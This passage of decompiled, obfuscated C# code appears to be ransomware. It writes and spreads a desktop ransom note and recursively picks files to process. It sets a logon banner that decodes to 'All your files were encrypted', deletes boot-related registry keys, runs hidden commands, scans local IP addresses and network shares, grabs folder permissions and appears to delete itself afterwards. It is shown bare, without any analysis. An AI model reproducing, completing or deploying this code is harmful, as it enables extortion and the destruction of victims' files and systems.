				streamWriter.WriteLine(getString_0(107396543));
				streamWriter.WriteLine(jGDSNxQzvqSx(getString_0(107390405)));
				streamWriter.WriteLine(PSLFxlnexYjPkVyG);
				if (CYtyMsjHbrwM == getString_0(107397033))
				{
					streamWriter.WriteLine(getString_0(107396543));
					streamWriter.WriteLine(jGDSNxQzvqSx(getString_0(107390372)) + Convert.ToString(fQuiHGzOTAlx.Count));
				}
				if (lHJbFcHZdNnC)
				{
					streamWriter.WriteLine(getString_0(107396543));
					streamWriter.WriteLine(jGDSNxQzvqSx(getString_0(107389751)));
					streamWriter.WriteLine(mzYnDQcPQMD.YyGTVHZwZCQyr());
				}
			}
			else
			{
				string text11 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395648));
				if (!text11.Contains(PSLFxlnexYjPkVyG) && !IflXfWBKZN)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395648), getString_0(107389718) + PSLFxlnexYjPkVyG);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in kEshrQncftX)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395648)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395648), item + getString_0(107395648), overwrite: true);
				}
				else
				{
					string text12 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395648));
					if (!text12.Contains(PSLFxlnexYjPkVyG) && !IflXfWBKZN)
					{
						File.AppendAllText(item + getString_0(107395648), getString_0(107389718) + PSLFxlnexYjPkVyG);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!CQvIJIjeDHGW && num > 10)
			{
				break;
			}
		}
		if (bMkJlSMZTmkVPl == getString_0(107396776))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389689)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389689));
					streamWriter2.WriteLine(jGDSNxQzvqSx(getString_0(107389656)));
					streamWriter2.WriteLine(getString_0(107396543));
					streamWriter2.WriteLine(jGDSNxQzvqSx(getString_0(107402204)));
					streamWriter2.WriteLine(PSLFxlnexYjPkVyG + jGDSNxQzvqSx(getString_0(107402115)));
					if (CYtyMsjHbrwM == getString_0(107397033))
					{
						streamWriter2.WriteLine(getString_0(107396543));
						streamWriter2.WriteLine(jGDSNxQzvqSx(getString_0(107402102)) + jGDSNxQzvqSx(getString_0(107390372)) + Convert.ToString(fQuiHGzOTAlx.Count) + jGDSNxQzvqSx(getString_0(107402115)));
					}
					if (lHJbFcHZdNnC)
					{
						streamWriter2.WriteLine(getString_0(107396543));
						streamWriter2.WriteLine(jGDSNxQzvqSx(getString_0(107389751)));
						streamWriter2.WriteLine(mzYnDQcPQMD.YyGTVHZwZCQyr());
					}
				}
				else
				{
					string text13 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395648));
					if (!text13.Contains(PSLFxlnexYjPkVyG) && !IflXfWBKZN)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389689), jGDSNxQzvqSx(getString_0(107402102)) + getString_0(107389718) + PSLFxlnexYjPkVyG + jGDSNxQzvqSx(getString_0(107402115)));
					}
				}
			}
			catch
			{
			}
		}
		if (jKmROTPyfgIG == getString_0(107396776))
		{
			try
			{
				if (CYtyMsjHbrwM == getString_0(107397033))
				{
					mzYnDQcPQMD.YsIQNECBfkXj(getString_0(107401529), getString_0(107401524), getString_0(107401543), string.Concat(jGDSNxQzvqSx(getString_0(107396609)), new WebClient().DownloadString(jGDSNxQzvqSx(getString_0(107396616))), getString_0(107401502), jGDSNxQzvqSx(getString_0(107396538)), DateTime.Now, getString_0(107396543), jGDSNxQzvqSx(getString_0(107401497)), Convert.ToString(fQuiHGzOTAlx.Count), getString_0(107396543), jGDSNxQzvqSx(getString_0(107396529)), PSLFxlnexYjPkVyG));
				}
				else
				{
					mzYnDQcPQMD.YsIQNECBfkXj(getString_0(107401529), getString_0(107401524), getString_0(107401543), string.Concat(jGDSNxQzvqSx(getString_0(107396609)), new WebClient().DownloadString(jGDSNxQzvqSx(getString_0(107396616))), getString_0(107401502), jGDSNxQzvqSx(getString_0(107396538)), DateTime.Now, getString_0(107396543), jGDSNxQzvqSx(getString_0(107401497)), Convert.ToString(fQuiHGzOTAlx.Count), getString_0(107396543), jGDSNxQzvqSx(getString_0(107396529)), PSLFxlnexYjPkVyG));
				}
			}
			catch
			{
			}
		}
		if (WXazMqNlFCpUGp == getString_0(107396776))
		{
			try
			{
				xSlIFSpLTS.nymqfkohQfcF(new Uri(getString_0(107401480)));
			}
			catch
			{
			}
		}
		if (bMkJlSMZTmkVPl == getString_0(107397033))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395648)))
				{
					Process.Start(jGDSNxQzvqSx(getString_0(107401479)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395648));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389689)))
				{
					Process.Start(jGDSNxQzvqSx(getString_0(107401454)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389689));
				}
			}
			catch
			{
			}
		}
		if (rGfFEILyJI == getString_0(107396776))
		{
			if (SgOqmfmWgCMNrdugt == getString_0(107396776) && !string.IsNullOrEmpty(mEpMhYqsELjvCfA) && !string.IsNullOrEmpty(bzSBnkmcadit))
			{
				BOLjPVsOTrfe(mEpMhYqsELjvCfA, bzSBnkmcadit);
			}
			else
			{
				BOLjPVsOTrfe(getString_0(107401405), getString_0(107401376));
			}
		}
		if (CXPDhTmLTlpN != getString_0(107401654))
		{
			frYcNvBpfaDQg(CXPDhTmLTlpN);
		}
		if (!string.IsNullOrEmpty(fbKaZQvVeOFg))
		{
			try
			{
				File.Delete(fbKaZQvVeOFg);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397141))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397141)));
			}
		}
		catch (Exception ex18)
		{
			try
			{
				File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107401669) + ex18.Message);
			}
			catch (Exception)
			{
			}
		}
		if (SBPYnaSzKyFP)
		{
			try
			{
				File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107401592));
			}
			catch (Exception)
			{
			}
		}
		if (VMhrtGevQTYP == getString_0(107401611))
		{
			GusvsHdJcE();
		}
	}

	public static void dZwyDZnQVVsHXe()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(jGDSNxQzvqSx(getString_0(107401058)), jGDSNxQzvqSx(getString_0(107401405)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int KSoAEZwyRtA(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> eXvCwgsfSMHHOK(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107400936)) && !text.Contains(getString_0(107400911)) && !text.Contains(getString_0(107400878)) && !text.ToLower().Contains(getString_0(107400829)) && !text.ToLower().Contains(getString_0(107400848)) && !text.Contains(getString_0(107401303)) && !text.Contains(getString_0(107401282)) && !text.ToLower().Contains(getString_0(107401269)) && !text.ToLower().Contains(getString_0(107401288)) && !text.ToLower().Contains(getString_0(107401219)) && !text.ToLower().Contains(getString_0(107401210)) && !text.ToLower().Contains(getString_0(107401225)) && !text.ToLower().Contains(getString_0(107401180)) && !text.ToLower().Contains(getString_0(107401199)) && !text.ToLower().Contains(getString_0(107401146)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107401121)) && !fileInfo.FullName.Contains(getString_0(107401136)) && !fileInfo.FullName.Contains(getString_0(107401087)) && !fileInfo.FullName.Contains(getString_0(107401102)) && !fileInfo.FullName.Contains(getString_0(107400541)) && !fileInfo.FullName.Contains(getString_0(107400556)) && !fileInfo.FullName.Contains(getString_0(107400507)) && !fileInfo.FullName.Contains(getString_0(107400522)) && !fileInfo.FullName.Contains(getString_0(107400477)) && !fileInfo.FullName.Contains(getString_0(107400488)) && !fileInfo.FullName.ToLower().Contains(getString_0(107400443)) && !fileInfo.FullName.ToLower().Contains(getString_0(107400462)) && !fileInfo.FullName.ToLower().Contains(getString_0(107400413)) && !fileInfo.FullName.ToLower().Contains(getString_0(107400428)) && !fileInfo.FullName.Contains(jGDSNxQzvqSx(getString_0(107400379))) && !fileInfo.FullName.Contains(getString_0(107400354)) && !fileInfo.FullName.Contains(getString_0(107397141)) && !fileInfo.FullName.Contains(getString_0(107400341)) && !fileInfo.FullName.EndsWith(getString_0(107395210)) && !fileInfo.FullName.EndsWith(getString_0(107400316)) && !fileInfo.FullName.EndsWith(getString_0(107400311)) && !fileInfo.FullName.EndsWith(getString_0(107400338)) && !fileInfo.FullName.EndsWith(getString_0(107400333)) && !fileInfo.FullName.Contains(getString_0(107400328)) && !fileInfo.FullName.Contains(COjZSLMnxffln) && !fileInfo.FullName.Contains(ndioqUCcjeEwRygxn) && !fileInfo.FullName.Contains(zSigBrcrKLvB))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(nPUtTAwIhKI) * 1024.0 * 1024.0 && CoRisaOZQor == getString_0(107396776))
						{
							list.Add(fileInfo.FullName);
							gzijLsLqKuAoLye(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && CoRisaOZQor == getString_0(107397033))
						{
							list.Add(fileInfo.FullName);
							gzijLsLqKuAoLye(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void uozMcBNAbBiV()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107400791));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!uneznyCLJqjxYvh.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107400738), getString_0(107397146)).Replace(getString_0(107400733), getString_0(107400738))
					.Replace(getString_0(107400724), getString_0(107401480))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					uneznyCLJqjxYvh.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107400738), getString_0(107397146)).Replace(getString_0(107400733), getString_0(107400738))
						.Replace(getString_0(107400724), getString_0(107401480))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107400751), getString_0(107401480)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string wCRzvBOPsnK(string hDqKOPqaOMnKf = "", string CncrqLRJlAq = "")
	{
		string result = getString_0(107401480);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = hDqKOPqaOMnKf,
				Arguments = CncrqLRJlAq,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void HLRJgXuHjbqaVb(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107400742),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string WtpiMWAvqdSBV(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string jGDSNxQzvqSx(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void xANuGRBaaSrbI(string RwATRFhxlSwVIz = "", string ldTgTfSCXbm = "SW5mb3JtYXRpb24uLi4=", string VEDLtbyxZOzxI = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		RwATRFhxlSwVIz = WtpiMWAvqdSBV(getString_0(107400693));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(jGDSNxQzvqSx(RwATRFhxlSwVIz), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(jGDSNxQzvqSx(getString_0(107400596)), jGDSNxQzvqSx(ldTgTfSCXbm));
				registryKey.SetValue(jGDSNxQzvqSx(getString_0(107400595)), jGDSNxQzvqSx(VEDLtbyxZOzxI));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			RwATRFhxlSwVIz = WtpiMWAvqdSBV(getString_0(107400022));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(jGDSNxQzvqSx(RwATRFhxlSwVIz), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(jGDSNxQzvqSx(getString_0(107399949)), jGDSNxQzvqSx(ldTgTfSCXbm));
				registryKey.SetValue(jGDSNxQzvqSx(getString_0(107399916)), jGDSNxQzvqSx(VEDLtbyxZOzxI));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void DCMvWfwrrcVAEh()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (SgOqmfmWgCMNrdugt == getString_0(107396776) && !string.IsNullOrEmpty(mEpMhYqsELjvCfA) && !string.IsNullOrEmpty(bzSBnkmcadit))
				{
					xANuGRBaaSrbI(getString_0(107401480), mEpMhYqsELjvCfA, bzSBnkmcadit);
				}
				else
				{
					xANuGRBaaSrbI(getString_0(107401480), getString_0(107401405), getString_0(107401376));
				}
			}
		}
		catch
		{
		}
	}

	public static void BOLjPVsOTrfe(string VGeNHJJYqGiI = "SW5mb3JtYXRpb24uLi4=", string NdspmZHjxfqnR = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(jGDSNxQzvqSx(VGeNHJJYqGiI));
		val.set_BalloonTipText(jGDSNxQzvqSx(NdspmZHjxfqnR));
		val.ShowBalloonTip(30000);
	}

	public static void frYcNvBpfaDQg(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107399887)), getString_0(107399838) + text + getString_0(107399829) + string_0);
	}

	private static void gbqGrViywCrG()
	{
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_025e: Expected O, but got Unknown
		//IL_0280: Unknown result type (might be due to invalid IL or missing references)
		//IL_0287: Expected O, but got Unknown
		xqBvFRZYusVVqA();
		List<vmDniBSADadT> list = vmDniBSADadT.IzZUdlFPBNYAqP();
		foreach (vmDniBSADadT item in list)
		{
			GvytrdWotRtJ.Add(item.IPAddress);
		}
		List<string> gvytrdWotRtJ = GvytrdWotRtJ;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a = delegate(string string_0)
			{
				CvtvsehZvVox CS_0024_003C_003E8__locals0 = new CvtvsehZvVox();
				CS_0024_003C_003E8__locals0.OfutQEOgrcWV = string_0;
				if ((!CS_0024_003C_003E8__locals0.OfutQEOgrcWV.StartsWith(getString_0(107398040)) && !CS_0024_003C_003E8__locals0.OfutQEOgrcWV.StartsWith(getString_0(107398067)) && !CS_0024_003C_003E8__locals0.OfutQEOgrcWV.StartsWith(getString_0(107398058)) && !CS_0024_003C_003E8__locals0.OfutQEOgrcWV.StartsWith(getString_0(107401480))) || !msEWcjiviXrSH.fckfXlLoyvqIiKs(CS_0024_003C_003E8__locals0.OfutQEOgrcWV))
				{
					return;
				}
				try
				{
					Thread.Sleep(gcVeDsTCahqU);
					uneznyCLJqjxYvh.Add(getString_0(107400738) + CS_0024_003C_003E8__locals0.OfutQEOgrcWV + getString_0(107398013));
					try
					{
						if (RxwgNpmsCUXw)
						{
							Console.WriteLine(getString_0(107400738) + CS_0024_003C_003E8__locals0.OfutQEOgrcWV + getString_0(107398013));
						}
					}
					catch
					{
					}
					Parallel.For(68, 91, delegate(int int_0)
					{
						Thread.Sleep(gcVeDsTCahqU);
						uneznyCLJqjxYvh.Add(CvtvsehZvVox.getString_0(107400744) + CS_0024_003C_003E8__locals0.OfutQEOgrcWV + CvtvsehZvVox.getString_0(107397152) + (char)int_0 + CvtvsehZvVox.getString_0(107349379));
						try
						{
							if (RxwgNpmsCUXw)
							{
								Console.WriteLine(CvtvsehZvVox.getString_0(107400744) + CS_0024_003C_003E8__locals0.OfutQEOgrcWV + CvtvsehZvVox.getString_0(107397152) + (char)int_0 + CvtvsehZvVox.getString_0(107349379));
							}
						}
						catch
						{
						}
					});
				}
				catch
				{
				}
			};
		}
		Parallel.ForEach(gvytrdWotRtJ, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a);
		try
		{
			msEWcjiviXrSH.CTWWGHAwiHnvS cTWWGHAwiHnvS = new msEWcjiviXrSH.CTWWGHAwiHnvS(msEWcjiviXrSH.HjHfGfuedGgt.XMyagMAkzU, msEWcjiviXrSH.wPOIfYjjdX.KXauamBoICK, msEWcjiviXrSH.NyPHLTyiWybvzs.lPYmWWQLQEye, msEWcjiviXrSH.epTWuZTaWycYz.SMNtFykeeVbbm);
			foreach (string item2 in cTWWGHAwiHnvS)
			{
				MatchCollection matchCollection = Regex.Matches(item2, getString_0(107399856));
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!uneznyCLJqjxYvh.Contains(item3.ToString()))
						{
							uneznyCLJqjxYvh.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (RxwgNpmsCUXw)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		drlepGoSENtlCm.pOgfeUJptxVRd();
		try
		{
			if (RxwgNpmsCUXw)
			{
				Console.WriteLine(getString_0(107400255));
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = WtpiMWAvqdSBV(getString_0(107400022));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(jGDSNxQzvqSx(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(jGDSNxQzvqSx(getString_0(107400214)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(jGDSNxQzvqSx(getString_0(107400157)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (KAbTnSEazgmpKG == getString_0(107396776))
		{
			LvUmKHjimIdzYt.BpwDKVrzSZDb();
		}
		try
		{
			if (RxwgNpmsCUXw)
			{
				Console.WriteLine(getString_0(107400144));
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107400791));
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
				if (uneznyCLJqjxYvh.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107400738), getString_0(107397146)).Replace(getString_0(107400733), getString_0(107400738))
					.Replace(getString_0(107400724), getString_0(107401480))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (RxwgNpmsCUXw)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107400738), getString_0(107397146)).Replace(getString_0(107400733), getString_0(107400738))
							.Replace(getString_0(107400724), getString_0(107401480))
							.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107400751), getString_0(107401480)));
					}
				}
				catch
				{
				}
				uneznyCLJqjxYvh.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107400738), getString_0(107397146)).Replace(getString_0(107400733), getString_0(107400738))
					.Replace(getString_0(107400724), getString_0(107401480))
					.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107400751), getString_0(107401480)));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (RxwgNpmsCUXw)
			{
				Console.WriteLine(getString_0(107400055));
			}
		}
		catch
		{
		}
	}

	public static bool QWdsIEizGgKuKem()
	{
		WebRequest webRequest = WebRequest.Create(getString_0(107399506));
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void MrGKXccdJYxE(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = jGDSNxQzvqSx(getString_0(107399473));
		processStartInfo.Arguments = getString_0(107399412) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool ZTPWQqzCqHBzuGb(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool YgTimJljarfi(string string_0)
	{
		try
		{
			PbhoBWPuGhtGLm CS_0024_003C_003E8__locals0 = new PbhoBWPuGhtGLm();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.RFtwrSGCcXR = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.RFtwrSGCcXR);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107399439);
		}
		catch
		{
			return false;
		}
	}

	public static void aodkgojwRcyrWr()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = WtpiMWAvqdSBV(getString_0(107399430));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(jGDSNxQzvqSx(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(jGDSNxQzvqSx(getString_0(107399772)));
					registryKey.DeleteSubKey(jGDSNxQzvqSx(getString_0(107399747)));
					registryKey.DeleteSubKey(jGDSNxQzvqSx(getString_0(107399762)));
					registryKey.DeleteSubKey(jGDSNxQzvqSx(getString_0(107399705)));
					registryKey.DeleteSubKey(jGDSNxQzvqSx(getString_0(107399473)));
					registryKey.DeleteSubKey(jGDSNxQzvqSx(getString_0(107399680)));
					registryKey.DeleteSubKey(jGDSNxQzvqSx(getString_0(107399887)));
					registryKey.Close();
				}
				string_ = WtpiMWAvqdSBV(getString_0(107399651));
				registryKey = Registry.LocalMachine.OpenSubKey(jGDSNxQzvqSx(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(jGDSNxQzvqSx(getString_0(107399554)));
					registryKey.Close();
				}
				string_ = WtpiMWAvqdSBV(getString_0(107399569));
				registryKey = Registry.LocalMachine.OpenSubKey(jGDSNxQzvqSx(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(jGDSNxQzvqSx(getString_0(107399554)));
					registryKey.Close();
				}
				string_ = WtpiMWAvqdSBV(getString_0(107399569));
				registryKey = Registry.CurrentUser.OpenSubKey(jGDSNxQzvqSx(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(jGDSNxQzvqSx(getString_0(107399554)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107399008)), jGDSNxQzvqSx(getString_0(107399023)));
			wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107398942)), jGDSNxQzvqSx(WtpiMWAvqdSBV(getString_0(107398933))));
			wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107398942)), jGDSNxQzvqSx(getString_0(107398787)));
			wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107399270)), jGDSNxQzvqSx(getString_0(107399221)));
		}
		catch
		{
		}
	}

	public static void vtJKNupXtRpM(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(jGDSNxQzvqSx(getString_0(107399180)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void jwzVdaHKUfgHS()
	{
		string string_ = WtpiMWAvqdSBV(getString_0(107399155));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(jGDSNxQzvqSx(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(jGDSNxQzvqSx(getString_0(107399042)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void xqBvFRZYusVVqA()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107398497)), jGDSNxQzvqSx(getString_0(107398484)));
			wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107398497)), jGDSNxQzvqSx(getString_0(107398386)));
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string umczGpTNNvwdB(string fBgjZNTJNmIPPAu, int DTTCNUEijlwk = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(DTTCNUEijlwk);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(fBgjZNTJNmIPPAu, 1, intPtr, ref DTTCNUEijlwk) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void GusvsHdJcE()
	{
		wCRzvBOPsnK(getString_0(107396282), jGDSNxQzvqSx(getString_0(107398720)));
		string text = jGDSNxQzvqSx(getString_0(107398526));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107400724) + text + getString_0(107400724) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396282);
